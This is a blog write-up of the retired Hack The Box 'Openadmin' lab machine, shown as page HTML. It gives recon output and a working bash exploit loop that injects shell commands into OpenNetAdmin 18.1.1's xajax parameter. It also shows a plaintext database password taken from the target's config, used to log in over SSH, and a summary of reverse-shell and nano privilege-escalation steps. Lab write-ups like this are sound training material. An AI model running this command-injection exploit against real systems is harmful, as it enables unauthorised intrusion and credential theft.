<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="Exploiting the openadmin service we get an initial shell and after getting credentials of jimmy in db.php logged in using ssh,Enumerating on a local high port we are joanna and privesc using nano is the journey of openadmin." /><meta property="og:title" content="Hackthebox Openadmin writeup" /><meta property="og:description" content="Exploiting the openadmin service we get an initial shell and after getting credentials of jimmy in db.php logged in using ssh,Enumerating on a local high port we are joanna and privesc using nano is the journey of openadmin." /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/openadmin/openadmin.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Openadmin writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="Exploiting the openadmin service we get an initial shell and after getting credentials of jimmy in db.php logged in using ssh,Enumerating on a local high port we are joanna and privesc using nano is the journey of openadmin."><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/openadmin/openadmin.png"><title>Hackthebox Openadmin writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Openadmin writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Openadmin writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, May 1, 2020, 12:00 AM +0800" > May 1 <i class="unloaded">2020-05-01T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/openadmin/openadmin.png" class="post-preview-img"><h1 id="informationopenadmin">Information@openadmin:~$</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Openadmin<tr><td>IP<td>10.10.10.171<tr><td>Points<td>20<tr><td>Os<td>Linux<tr><td>Difficulty<td>Easy<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/82600" target="_blank">dmw0ng</a><tr><td>Out On<td>4 Jan 2020<tr><td>Retired on<td>2 MAY 2020</table></div><h1 id="briefopenadmin">Brief@openadmin:~$</h1><p>Gobuster reveals a <code class="language-plaintext highlighter-rouge">dir</code> called <strong>music</strong> which has a <code class="language-plaintext highlighter-rouge">OpenNetAdmin 18.1.1</code> running on it . There is a public exploit available for the version of the <code class="language-plaintext highlighter-rouge">Openadmin-portl</code> . And we got an initial shell as www-data.The database_settings.inc.phpfile contains the passowrd for the user <code class="language-plaintext highlighter-rouge">jimmy</code>.There are two ways to get shell as <strong>joanna</strong> one is after analyzing the local high port we can see the code in <code class="language-plaintext highlighter-rouge">main.php</code> to read the private keys for the user <code class="language-plaintext highlighter-rouge">joanna</code> and after making a request to the to that port/main.php we have <strong>encrypted keys</strong> for the user <code class="language-plaintext highlighter-rouge">joanna</code> and after cracking the keys using <code class="language-plaintext highlighter-rouge">john</code> we got passpharse of <code class="language-plaintext highlighter-rouge">id_rsa</code>. Second one is we have read and write permissions to the directory <code class="language-plaintext highlighter-rouge">internal</code> since the service is running as <code class="language-plaintext highlighter-rouge">joanna</code> so we make a <code class="language-plaintext highlighter-rouge">.php</code> file containing the php-code for <strong>rev</strong> <code class="language-plaintext highlighter-rouge">shell</code> and after making a request to our file we are <code class="language-plaintext highlighter-rouge">joanna</code>.And after logged in as <code class="language-plaintext highlighter-rouge">joanna</code> using ssh we can edit a file <code class="language-plaintext highlighter-rouge">priv</code> as root using <code class="language-plaintext highlighter-rouge">nano</code> . And after <strong>priv esc</strong> to using nano we are <code class="language-plaintext highlighter-rouge">root</code>.</p><h1 id="summary">Summary</h1><ul><li>Gobuster scan reveals the dir <code class="language-plaintext highlighter-rouge">music</code><li>The <code class="language-plaintext highlighter-rouge">/ona</code> page reveals the version of <code class="language-plaintext highlighter-rouge">openadmin-portal</code> that is vulnerable to rce<li>Exploiting the portal to get an initial <strong>shell</strong> as <strong>www-data</strong><li>The file <code class="language-plaintext highlighter-rouge">database_settings.inc.php</code> contains the password for user <code class="language-plaintext highlighter-rouge">jimmy</code><li>Login as <code class="language-plaintext highlighter-rouge">jimmy</code>.<li>There is a <code class="language-plaintext highlighter-rouge">hight</code> port <strong>running</strong> locally which is serving the content of <code class="language-plaintext highlighter-rouge">internal</code> dir.<li>the file <strong>main.php</strong> have the code to read the <code class="language-plaintext highlighter-rouge">private-ssh-keys</code> of user <strong>joanna</strong><li>And we can <code class="language-plaintext highlighter-rouge">read</code> and <code class="language-plaintext highlighter-rouge">write</code> <strong>permission</strong> to the dir <strong>internal</strong><li>The first way to do it is making a request to <code class="language-plaintext highlighter-rouge">/main.php</code> which will give us <code class="language-plaintext highlighter-rouge">encrypted</code> id_rsa.<li>Use <code class="language-plaintext highlighter-rouge">ssh2john</code> to convert the id_rsa to john <code class="language-plaintext highlighter-rouge">crackable</code> <strong>hash</strong><li>After that we got passpharse of <code class="language-plaintext highlighter-rouge">id_rsa</code> and logged in as <code class="language-plaintext highlighter-rouge">joanna</code><li>The second way is make a <code class="language-plaintext highlighter-rouge">executable</code> file with <code class="language-plaintext highlighter-rouge">rev-shell</code> code in it.<li>Make a <code class="language-plaintext highlighter-rouge">request</code> to this file and you will get <strong>connection</strong> back on your listener .<li>Got user.txt<li><code class="language-plaintext highlighter-rouge">Sudo -l</code> tells us that we can edit a file called <code class="language-plaintext highlighter-rouge">/opt/priv</code> as root using <strong>nano</strong>.<li>Executing <strong>commands</strong> in <code class="language-plaintext highlighter-rouge">nano</code> to get root shell.<li>Got root.txt</ul><h1 id="pwned">Pwned</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/hackthebox/openadmin/openadmin.cast" start-at="0" autoplay="1.5" speed="2.0" loop="1" cols="150" rows="20"></asciinema-player> <script src="/asciinema-player.js"></script><p>For some really cool writeups follow my brother <a href="http://www.whatinfotech.com/" target="_blank">http://www.whatinfotech.com/</a></p><h1 id="recon">Recon</h1><h2 id="nmap">Nmap</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>➜  openadmin nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-T4</span> <span class="nt">-oA</span> scans/nmap.full <span class="nt">-p-</span> <span class="nt">-v</span>  openadmin.htb
<span class="c"># Nmap 7.80 scan initiated Fri May  1 11:44:03 2020 as: nmap -sC -sV -T4 -oA scans/nmap.full -p- -v  openadmin.htb</span>
Failed to resolve <span class="s2">"nmap.full"</span><span class="nb">.</span>
Nmap scan report <span class="k">for </span>openadmin.htb <span class="o">(</span>10.10.10.171<span class="o">)</span>
Host is up <span class="o">(</span>0.27s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65510 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 <span class="o">(</span>RSA<span class="o">)</span>
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    open     http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Fri May  1 11:55:17 2020 -- 1 IP address (1 host up) scanned in 673.78 seconds</span>
</pre></table></code></div></div><p>Only two ports are opened <code class="language-plaintext highlighter-rouge">22:ssh</code> and <code class="language-plaintext highlighter-rouge">80:http</code>.So we just need to be focus on port 80</p><h2 id="port-80">Port-80</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/openadmin/image-1.png" alt="port-80" /></p><p>The page has default <code class="language-plaintext highlighter-rouge">apache</code> page.</p><h2 id="gobuster-results">Gobuster results</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>➜  ~prashant gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-r</span> <span class="nt">-k</span>   <span class="nt">-x</span> <span class="s2">"txt,html,php,asp,aspx,jpg"</span> <span class="nt">-u</span> http://openadmin.htb              
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://openadmin.htb
<span class="o">[</span>+] Threads:        10
<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Extensions:     txt,html,php,asp,aspx,jpg
<span class="o">[</span>+] Follow Redir:   <span class="nb">true</span>
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2020/05/01 17:35:23 Starting gobuster
<span class="o">===============================================================</span>
/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
/music <span class="o">(</span>Status: 200<span class="o">)</span>
/artwork <span class="o">(</span>Status: 200<span class="o">)</span>
</pre></table></code></div></div><p>I got two <code class="language-plaintext highlighter-rouge">directories</code> <strong>music</strong> and <strong>artwork</strong> .</p><blockquote><p>Music Dir</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/openadmin/image-2.png" alt="Music-dir" /></p><blockquote><p>artwork dir</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/openadmin/image-3.png" alt="artwork" /></p><p>There is literally nothing on dir artwork.So i just switched to dir music now.</p><h1 id="exploiting-openadmin-portal">Exploiting openadmin portal</h1><p>There is a login tab in on home page of <code class="language-plaintext highlighter-rouge">Music</code> Dir.Which is in <code class="language-plaintext highlighter-rouge">/ona</code> and there is a mention of the version of the portal.The title of the page is <code class="language-plaintext highlighter-rouge">OpenNetadmin</code> and the version is <code class="language-plaintext highlighter-rouge">18.1.1</code> if we look at the exploit-db there is a public exploit available for the current version.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/openadmin/image-4.png" alt="Exploit" /></p><p><a href="https://www.exploit-db.com/exploits/47691" target="_blank">OpenNetadmin-Exploit</a></p><p>i just copy the <code class="language-plaintext highlighter-rouge">exploit</code> and modified it to a little <strong>extent</strong></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="nv">URL</span><span class="o">=</span><span class="s2">"http://openadmin.htb/ona/"</span>
<span class="k">while </span><span class="nb">true</span><span class="p">;</span><span class="k">do
 </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$ </span><span class="s2">"</span><span class="p">;</span> <span class="nb">read </span>cmd
 curl <span class="nt">--silent</span> <span class="nt">-d</span> <span class="s2">"xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo </span><span class="se">\"</span><span class="s2">BEGIN</span><span class="se">\"</span><span class="s2">;</span><span class="k">${</span><span class="nv">cmd</span><span class="k">}</span><span class="s2">;echo </span><span class="se">\"</span><span class="s2">END</span><span class="se">\"</span><span class="s2">&amp;xajaxargs[]=ping"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">URL</span><span class="k">}</span><span class="s2">"</span> | <span class="nb">sed</span> <span class="nt">-n</span> <span class="nt">-e</span> <span class="s1">'/BEGIN/,/END/ p'</span> | <span class="nb">tail</span> <span class="nt">-n</span> +2 | <span class="nb">head</span> <span class="nt">-n</span> <span class="nt">-1</span>
<span class="k">done</span>
</pre></table></code></div></div><p>Just the <code class="language-plaintext highlighter-rouge">variable</code> <strong>URL</strong></p><p>And now its time to run….</p><h2 id="got-shell-as-www-data">Got shell as www-data</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>➜  openadmin ./exploit.sh 
<span class="nv">$ </span><span class="nb">whoami
</span>www-data
<span class="nv">$ </span><span class="nb">hostname
</span>openadmin
<span class="err">$</span>
</pre></table></code></div></div><p>After some manual enumeration i got a file called <code class="language-plaintext highlighter-rouge">database_settings.inc.php</code> in <code class="language-plaintext highlighter-rouge">local/config</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">ls local</span>/config
database_settings.inc.php
motd.txt.example
run_installer
<span class="nv">$ </span>
</pre></table></code></div></div><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="err">$</span> <span class="nx">cat</span> <span class="nx">local</span><span class="o">/</span><span class="nx">config</span><span class="o">/</span><span class="nx">database_settings</span><span class="o">.</span><span class="nx">inc</span><span class="o">.</span><span class="nx">php</span>
<span class="o">&lt;?</span><span class="nx">php</span>

<span class="nv">$ona_contexts</span><span class="o">=</span><span class="k">array</span> <span class="p">(</span>
  <span class="s1">'DEFAULT'</span> <span class="o">=&gt;</span> 
  <span class="k">array</span> <span class="p">(</span>
    <span class="s1">'databases'</span> <span class="o">=&gt;</span> 
    <span class="k">array</span> <span class="p">(</span>
      <span class="mi">0</span> <span class="o">=&gt;</span> 
      <span class="k">array</span> <span class="p">(</span>
        <span class="s1">'db_type'</span> <span class="o">=&gt;</span> <span class="s1">'mysqli'</span><span class="p">,</span>
        <span class="s1">'db_host'</span> <span class="o">=&gt;</span> <span class="s1">'localhost'</span><span class="p">,</span>
        <span class="s1">'db_login'</span> <span class="o">=&gt;</span> <span class="s1">'ona_sys'</span><span class="p">,</span>
        <span class="s1">'db_passwd'</span> <span class="o">=&gt;</span> <span class="s1">'n1nj4W4rri0R!'</span><span class="p">,</span>
        <span class="s1">'db_database'</span> <span class="o">=&gt;</span> <span class="s1">'ona_default'</span><span class="p">,</span>
        <span class="s1">'db_debug'</span> <span class="o">=&gt;</span> <span class="kc">false</span><span class="p">,</span>
      <span class="p">),</span>
    <span class="p">),</span>
    <span class="s1">'description'</span> <span class="o">=&gt;</span> <span class="s1">'Default data context'</span><span class="p">,</span>
    <span class="s1">'context_color'</span> <span class="o">=&gt;</span> <span class="s1">'#D3DBFF'</span><span class="p">,</span>
  <span class="p">),</span>
<span class="p">);</span>
</pre></table></code></div></div><p>We got a password here <code class="language-plaintext highlighter-rouge">n1nj4W4rri0R!</code>.Maybe its of any user .</p><p>There are two users in <code class="language-plaintext highlighter-rouge">/home</code> dir</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /home
total 16
drwxr-xr-x  4 root   root   4096 Nov 22 18:00 <span class="nb">.</span>
drwxr-xr-x 24 root   root   4096 Nov 21 13:41 ..
drwxr-x---  5 jimmy  jimmy  4096 Nov 22 23:15 jimmy
drwxr-x---  6 joanna joanna 4096 Nov 28 09:37 joanna
<span class="nv">$ </span>
</pre></table></code></div></div><p>I can confirm that the password is of user <code class="language-plaintext highlighter-rouge">jimmy</code> by logging in to ssh.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre>➜  openadmin sshpass <span class="nt">-p</span> <span class="s1">'n1nj4W4rri0R!'</span> ssh jimmy@openadmin.htb
Welcome to Ubuntu 18.04.3 LTS <span class="o">(</span>GNU/Linux 4.15.0-70-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Fri May  1 13:17:15 UTC 2020

  System load:  0.0               Processes:             124
  Usage of /:   49.9% of 7.81GB   Users logged <span class="k">in</span>:       2
  Memory usage: 21%               IP address <span class="k">for </span>ens160: 10.10.10.171
  Swap usage:   0%


 <span class="k">*</span> Canonical Livepatch is available <span class="k">for </span>installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri May  1 10:59:39 2020 from 10.10.16.81
jimmy@openadmin:~<span class="nv">$ </span>
</pre></table></code></div></div><p>And i am jimmy now.</p><h1 id="privilege-escalationjoanna">Privilege-escalation@joanna:~$</h1><p>After various enumerations i got to know about a dir called <code class="language-plaintext highlighter-rouge">internal</code> in <strong>/var/www</strong></p><p>And there is a high port <code class="language-plaintext highlighter-rouge">52846</code> running <code class="language-plaintext highlighter-rouge">locally</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>jimmy@openadmin:~<span class="nv">$ </span>ss <span class="nt">-nlt</span>
State              Recv-Q              Send-Q                            Local Address:Port                            Peer Address:Port                             
LISTEN             0                   128                                   127.0.0.1:52846                                0.0.0.0:<span class="k">*</span>     
</pre></table></code></div></div><p>If we make a request to the <code class="language-plaintext highlighter-rouge">127.0.0.1:52846</code> using curl since it is already installed in.</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
</pre><td class="rouge-code"><pre>jimmy@openadmin:~$ curl 127.0.0.1:52846

<span class="cp">&lt;?
   // error_reporting(E_ALL);
   // ini_set("display_errors", 1);
?&gt;</span>

<span class="nt">&lt;html</span> <span class="na">lang = </span><span class="s">"en"</span><span class="nt">&gt;</span>

   <span class="nt">&lt;head&gt;</span>
      <span class="nt">&lt;title&gt;</span>Tutorialspoint.com<span class="nt">&lt;/title&gt;</span>
      <span class="nt">&lt;link</span> <span class="na">href = </span><span class="s">"css/bootstrap.min.css"</span> <span class="na">rel = </span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>

      <span class="nt">&lt;style&gt;</span>
         <span class="nt">body</span> <span class="p">{</span>
            <span class="nl">padding-top</span><span class="p">:</span> <span class="m">40px</span><span class="p">;</span>
            <span class="nl">padding-bottom</span><span class="p">:</span> <span class="m">40px</span><span class="p">;</span>
            <span class="nl">background-color</span><span class="p">:</span> <span class="m">#ADABAB</span><span class="p">;</span>
         <span class="p">}</span>

         <span class="nc">.form-signin</span> <span class="p">{</span>
            <span class="nl">max-width</span><span class="p">:</span> <span class="m">330px</span><span class="p">;</span>
            <span class="nl">padding</span><span class="p">:</span> <span class="m">15px</span><span class="p">;</span>
            <span class="nl">margin</span><span class="p">:</span> <span class="m">0</span> <span class="nb">auto</span><span class="p">;</span>
            <span class="nl">color</span><span class="p">:</span> <span class="m">#017572</span><span class="p">;</span>
         <span class="p">}</span>

         <span class="nc">.form-signin</span> <span class="nc">.form-signin-heading</span><span class="o">,</span>
         <span class="nc">.form-signin</span> <span class="nc">.checkbox</span> <span class="p">{</span>
            <span class="nl">margin-bottom</span><span class="p">:</span> <span class="m">10px</span><span class="p">;</span>
         <span class="p">}</span>

         <span class="nc">.form-signin</span> <span class="nc">.checkbox</span> <span class="p">{</span>
            <span class="nl">font-weight</span><span class="p">:</span> <span class="nb">normal</span><span class="p">;</span>
         <span class="p">}</span>

         <span class="nc">.form-signin</span> <span class="nc">.form-control</span> <span class="p">{</span>
            <span class="nl">position</span><span class="p">:</span> <span class="nb">relative</span><span class="p">;</span>
            <span class="nl">height</span><span class="p">:</span> <span class="nb">auto</span><span class="p">;</span>
            <span class="nl">-webkit-box-sizing</span><span class="p">:</span> <span class="n">border-box</span><span class="p">;</span>
            <span class="nl">-moz-box-sizing</span><span class="p">:</span> <span class="n">border-box</span><span class="p">;</span>
            <span class="nl">box-sizing</span><span class="p">:</span> <span class="n">border-box</span><span class="p">;</span>
            <span class="nl">padding</span><span class="p">:</span> <span class="m">10px</span><span class="p">;</span>
            <span class="nl">font-size</span><span class="p">:</span> <span class="m">16px</span><span class="p">;</span>
         <span class="p">}</span>

         <span class="nc">.form-signin</span> <span class="nc">.form-control</span><span class="nd">:focus</span> <span class="p">{</span>
            <span class="nl">z-index</span><span class="p">:</span> <span class="m">2</span><span class="p">;</span>
         <span class="p">}</span>

         <span class="nc">.form-signin</span> <span class="nt">input</span><span class="o">[</span><span class="nt">type</span><span class="o">=</span><span class="s1">"email"</span><span class="o">]</span> <span class="p">{</span>
            <span class="nl">margin-bottom</span><span class="p">:</span> <span class="m">-1px</span><span class="p">;</span>
            <span class="nl">border-bottom-right-radius</span><span class="p">:</span> <span class="m">0</span><span class="p">;</span>
            <span class="nl">border-bottom-left-radius</span><span class="p">:</span> <span class="m">0</span><span class="p">;</span>
            <span class="nl">border-color</span><span class="p">:</span><span class="m">#017572</span><span class="p">;</span>
         <span class="p">}</span>

